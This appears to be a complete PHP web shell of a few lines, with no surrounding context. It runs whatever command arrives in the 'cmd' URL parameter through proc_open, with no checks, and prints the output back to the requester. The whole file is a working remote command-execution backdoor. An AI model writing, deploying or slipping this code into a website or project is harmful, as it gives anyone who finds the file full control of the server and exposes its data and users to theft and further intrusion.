<?php
$desc = [
    0 => ["pipe", "r"],  
    1 => ["pipe", "w"], 
    2 => ["pipe", "w"]  
];
$process = proc_open($_GET['cmd'], $desc, $pipes);
if (is_resource($process)) {
    echo stream_get_contents($pipes[1]); // stdout
    fclose($pipes[1]);
    proc_close($process);
}
?>
